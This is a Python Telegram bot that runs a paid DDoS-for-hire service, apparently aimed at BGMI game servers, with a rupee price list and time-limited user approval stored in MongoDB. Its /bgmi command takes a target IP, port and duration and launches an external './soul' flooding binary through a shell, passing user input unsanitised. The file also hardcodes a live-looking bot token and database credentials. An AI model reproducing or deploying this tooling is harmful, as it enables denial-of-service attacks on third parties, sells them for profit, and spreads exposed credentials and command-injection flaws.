from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from datetime import datetime, timedelta
import subprocess
import time  # Import time for sleep functionalit
import asyncio
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from pymongo import MongoClient

# Bot token
BOT_TOKEN = '6878109155:AAGG2ozAyqdcosafpEbpxxSV7CjYCa-nWi0'  # Replace with your bot token

# Admin ID
ADMIN_ID = 7374612242

# Admin information
ADMIN_USERNAME = "❄️ TRUSTVIP ❄️"
ADMIN_CONTACT = "@TRUSTVIP_MOD0"

# MongoDB Connection
MONGO_URL = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
client = MongoClient(MONGO_URL)

# Database and Collection
db = client["dake"]  # Database name
collection = db["Users"]  # Collection name

# Dictionary to track recent attacks with a cooldown period
recent_attacks = {}

# Cooldown period in seconds
COOLDOWN_PERIOD = 180

# Approve a user and save to MongoDB with dynamic duration
async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])
        duration_value = int(context.args[1])  # Value of time duration (e.g., 10, 5, etc.)
        duration_type = context.args[2].lower()  # Type of duration: days, hours, minutes

        # Calculate expiration date based on duration type
        if duration_type == "days":
            expiration_date = datetime.now() + timedelta(days=duration_value)
        elif duration_type == "hours":
            expiration_date = datetime.now() + timedelta(hours=duration_value)
        elif duration_type == "minutes":
            expiration_date = datetime.now() + timedelta(minutes=duration_value)
        else:
            raise ValueError("Invalid duration type. Use 'days', 'hours', or 'minutes'.")

        # Save user to MongoDB
        collection.update_one(
            {"user_id": user_id},  # Search filter
            {"$set": {"user_id": user_id, "expiration_date": expiration_date}},  # Update or insert
            upsert=True
        )

        await update.message.reply_text(
            f"✅ *User {user_id} approved for {duration_value} {duration_type}!*\n"
            f"*Access expires on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            "💫 The owner of this bot is ❄️TRUST VIP❄️. Contact @TRUSTVIP_MOD0.",
            parse_mode="Markdown",
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /approve <user_id> <duration_value> <duration_type>*\n"
            "Example: `/approve 123456789 5 hours` or `/approve 123456789 10 days`",
            parse_mode="Markdown",
        )
        
# Remove a user from MongoDB
async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode='Markdown')
        return

    try:
        user_id = int(context.args[0])

        # Remove user from MongoDB
        result = collection.delete_one({"user_id": user_id})

        if result.deleted_count > 0:
            await update.message.reply_text(f"❌ *User {user_id} has been removed from the approved list.*", parse_mode='Markdown')
        else:
            await update.message.reply_text("🚫 *User not found in the approved list.*", parse_mode='Markdown')
    except IndexError:
        await update.message.reply_text("❌ *Usage: /remove <user_id>*", parse_mode='Markdown')

# Check if a user is approved
def is_user_approved(user_id):
    user = collection.find_one({"user_id": user_id})
    if user:
        expiration_date = user.get("expiration_date")
        if datetime.now() < expiration_date:
            return True
        else:
            # Remove expired user
            collection.delete_one({"user_id": user_id})
    return False

# Function to add spaced buttons to messages
def get_default_buttons():
    keyboard = [
        [InlineKeyboardButton(" JOIN OUR CHANNEL 💖", url="https://t.me/+3c0NNd9oWNwyMjI1")],
        [InlineKeyboardButton(" CONTACT OWNER 👻", url="https://t.me/TRUSTVIP_MOD0")]
    ]
    return InlineKeyboardMarkup(keyboard)

# Command Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    welcome_message = (
        f"👋 *Hello, {user.first_name}!*\n\n"
        "✨ *Welcome to the bot.*\n"
        "📜 *Type /help to see available commands.*\n\n"
        "💫 The owner of this bot is ❄️ TRUSTVIP ❄️. Contact @TRUSTVIP_MOD0."
    )
    await update.message.reply_text(welcome_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_message = (
        "📜 *Here are the available commands:*\n\n"
        "🚀/bgmi - For Attack In Game\n"
        "💶/price - Check the latest prices\n"
        "📑/rule - View the rules\n"
        "👤/owner - Information about the bot owner\n"
        "💌/myinfo - View your personal information\n"
        "-----------------------------------------------------------------------\n"
        "👤/admincommand - Ye Tumhare Kisi Kaam Ka Nahi\n\n"
        "💫 The owner of this bot is ❄️ TRUST VIP❄️. Contact @TRUSTVIP_MOD0."
    )
    await update.message.reply_text(help_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

# Global variables to track current attack
current_attack_user = None  # Tracks the current user attacking
current_attack_end_time = None  # Tracks when the current attack will end

# Global variable for attack time limit (default: 240 seconds)
attack_time_limit = 240

# Command to set the attack limit dynamically
async def set_attack_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        new_limit = int(context.args[0])  # New attack limit in seconds
        if new_limit < 1:
            await update.message.reply_text("⚠️ *Invalid limit. Please enter a value greater than 0.*", parse_mode="Markdown")
            return
        global attack_time_limit
        attack_time_limit = new_limit  # Update global attack time limit
        await update.message.reply_text(f"✅ *Attack time limit has been updated to {new_limit} seconds.*", parse_mode="Markdown")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ *Usage: /setattacklimit <duration_in_seconds>*", parse_mode="Markdown")

# BGMI command: Restricting the attack time limit based on `attack_time_limit` variable
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack_user, current_attack_end_time, attack_time_limit

    user_id = update.effective_user.id
    user_name = update.effective_user.first_name

    # Check if user is approved
    if not is_user_approved(user_id):
        await update.message.reply_text(
            "😂 *🚧 अरे चोमू खरीद लो लौडे 🤣 :- @TRUSTVIP_MOD0.*\n"
            "💬 *Please contact the owner if you believe this is an error.*",
            parse_mode="Markdown",
        )
        return

    # Validate arguments (IP, Port, Duration)
    if len(context.args) != 3:
        await update.message.reply_text(
            f"✅ *Usage:* /bgmi <ip> <port> <duration>",
            parse_mode="Markdown",
        )
        return

    ip = context.args[0]
    port = context.args[1]
    try:
        time_duration = int(context.args[2])
    except ValueError:
        await update.message.reply_text(
            "⚠️ *Invalid duration. Please enter a valid number.*",
            parse_mode="Markdown",
        )
        return

    # Check if duration exceeds the attack time limit
    if time_duration > attack_time_limit:
        await update.message.reply_text(
            f"⚠️ *You cannot attack for more than {attack_time_limit} seconds.*",
            parse_mode="Markdown",
        )
        return

    # Check if another attack is in progress
    if current_attack_user is not None:
        remaining_time = (current_attack_end_time - datetime.now()).total_seconds()
        if remaining_time > 0:
            await update.message.reply_text(
                f"⚠️ *Another user (ID: {current_attack_user}) is already attacking. Please wait {int(remaining_time)} seconds.*",
                parse_mode="Markdown",
            )
            return
        else:
            # If time has passed, reset the global variables
            current_attack_user = None
            current_attack_end_time = None

    # Set current user as the attacking user
    current_attack_user = user_id
    current_attack_end_time = datetime.now() + timedelta(seconds=time_duration)

    # Send attack started message
    await update.message.reply_text(
        f"🚀 *ATTACK STARTED*\n"
        f"🌐 *IP:* {ip}\n"
        f"🎯 *PORT:* {port}\n"
        f"⏳ *DURATION:* {time_duration} seconds\n"
        f"👤 *User:* {user_name} (ID: {user_id})\n\n"
        "💫 The owner of this bot is ❄️TRUST VIP❄️. Contact @TRUSTVIP_MOD0.",
        parse_mode="Markdown",
    )

    # Start the attack process
    asyncio.create_task(run_attack(ip, port, time_duration, update, user_id))
    
# Default thread value
default_thread = "900"

# Command to set thread dynamically
async def set_thread(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        global default_thread
        new_thread = context.args[0]
        if not new_thread.isdigit():
            await update.message.reply_text("❌ *Invalid thread value. Please provide a numeric value.*", parse_mode="Markdown")
            return

        default_thread = new_thread  # Update the default thread value
        await update.message.reply_text(f"✅ *Thread value updated to {default_thread}.*", parse_mode="Markdown")
    except IndexError:
        await update.message.reply_text("❌ *Usage: /setthread <thread_value>*", parse_mode="Markdown")

# Modify the attack command to use the dynamic thread value
async def run_attack(ip, port, time_duration, update, user_id):
    global current_attack_user, current_attack_end_time, default_thread

    try:
        # Simulate the attack command with dynamic thread
        command = f"./soul {ip} {port} {time_duration} {default_thread}"
        process = subprocess.Popen(command, shell=True)

        # Wait for the specified duration
        await asyncio.sleep(time_duration)

        # Terminate the process after the duration
        process.terminate()

        # Send attack finished message
        await update.message.reply_text(
            f"✅ *ATTACK FINISHED*\n"
            f"🌐 *IP:* {ip}\n"
            f"🎯 *PORT:* {port}\n"
            f"⏳ *DURATION:* {time_duration} seconds\n"
            f"💻 *Thread Used:* {default_thread}\n"
            f"👤 *User ID:* {user_id}\n\n"
            "💫 The owner of this bot is ❄️ TRUSTVIP ❄️. Contact @TRUSTVIP_MOD0.",
            parse_mode="Markdown",
        )

    except Exception as e:
        # Handle errors during the attack
        await update.message.reply_text(
            f"⚠️ *Error occurred during the attack:* {str(e)}",
            parse_mode="Markdown",
        )
    finally:
        # Reset global variables to allow the next attack
        if current_attack_user == user_id:
            current_attack_user = None
            current_attack_end_time = None
            
async def price(update: Update, context: ContextTypes.DEFAULT_TYPE):
    price_message = (
        "💰 *PRICE LIST:*\n\n"
        "⭐ 1 Day = ₹115\n"
        "⭐ 3 Days = ₹295\n"
        "⭐ 1 Week = ₹525\n"
        "⭐ 1 Month = ₹995\n"
        "⭐ Lifetime = ₹1,585\n\n"
        "💫 The owner of this bot is ❄️ TRUST VIP❄️. Contact @TRUSTVIP_MOD0."
    )
    await update.message.reply_text(price_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def rule(update: Update, context: ContextTypes.DEFAULT_TYPE):
    rule_message = "⚠️ *Rule: Ek Time Pe Ek Hi Attack Lagana*\n\n💫 The owner informed."
    await update.message.reply_text(rule_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"👤 *The owner of this bot is {ADMIN_USERNAME}.*\n"
        f"✉️ *Contact:* {ADMIN_CONTACT}\n\n", parse_mode='Markdown'
    )

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    info_message = (
        "📝 *Your Information:*\n"
        f"🔗 *Username:* @{user.username}\n"
        f"🆔 *User ID:* {user.id}\n"
        f"👤 *First Name:* {user.first_name}\n"
        f"👥 *Last Name:* {user.last_name if user.last_name else 'N/A'}\n\n"
        "💫 The owner of this bot is ❄️❄️. Contact @TRUSTVIP_MOD0."
    )
    await update.message.reply_text(info_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def admincommand(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await not_authorized_message(update)
        return

    admin_message = (
        "🔧 *Admin-only commands:*\n"
        "/approve - Add user\n"
        "/remove - Remove user\n"
        "/set - Set Attack Time\n"
        "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @TRUSTVIP_MOD0."
    )
    await update.message.reply_text(admin_message, parse_mode='Markdown')
    
import sys

# Encrypted password in Korean (hidden representation of FUCK YOU)
SECRET_PASSWORD = "구구공오구칠육공공칠팔공이삼공이"

# Function to convert numeric input to Korean equivalent
def convert_to_korean(numeric_password):
    number_to_korean = {
        "0": "공",  # 0 -> 공
        "1": "일",  # 1 -> 일
        "2": "이",  # 2 -> 이
        "3": "삼",  # 3 -> 삼
        "4": "사",  # 4 -> 사
        "5": "오",  # 5 -> 오
        "6": "육",  # 6 -> 육
        "7": "칠",  # 7 -> 칠
        "8": "팔",  # 8 -> 팔
        "9": "구"   # 9 -> 구
    }
    return "".join([number_to_korean[digit] for digit in numeric_password])

def ask_for_password():
    print("🔒 This script is password-protected.")
    password = input("Enter the password to proceed: ")
    
    # Convert user input to Korean equivalent and validate
    try:
        korean_password = convert_to_korean(password)
    except KeyError:
        print("❌ Invalid password! Exiting...")
        sys.exit(1)  # Exit the script if invalid characters are entered

    if korean_password != SECRET_PASSWORD:
        print("❌ Incorrect password! Exiting...")
        sys.exit(1)  # Exit the script with an error code
    
    print("✅ Password verified. Welcome!")

# Call the function before running the main script
ask_for_password()

# Main function to run the bot
def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("price", price))
    application.add_handler(CommandHandler("rule", rule))
    application.add_handler(CommandHandler("owner", owner))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("admincommand", admincommand))
    application.add_handler(CommandHandler("set", set_attack_limit))
    application.add_handler(CommandHandler("setthread", set_thread))

    # Start the bot
    application.run_polling()
    print("Bot is running...")

if __name__ == '__main__':
    main()
    
